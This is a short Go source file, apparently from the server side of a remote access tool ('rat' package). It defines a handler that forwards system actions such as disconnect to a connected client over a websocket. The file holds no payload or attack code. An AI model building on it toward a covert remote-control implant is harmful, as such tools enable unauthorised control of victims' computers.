package main

import (
	"rat/shared/system"

	"time"

	"golang.org/x/net/websocket"
)

type SysMessage struct {
	Action system.Action `json:"action"`
}

func (sys SysMessage) Handle(ws *websocket.Conn, client *Client) error {
	client.Queue <- &SysPacket{sys.Action}

	if sys.Action == system.Disconnect {
		go func() {
			time.Sleep(time.Second)
			client.Conn.Close()
		}()
	}

	return nil
}
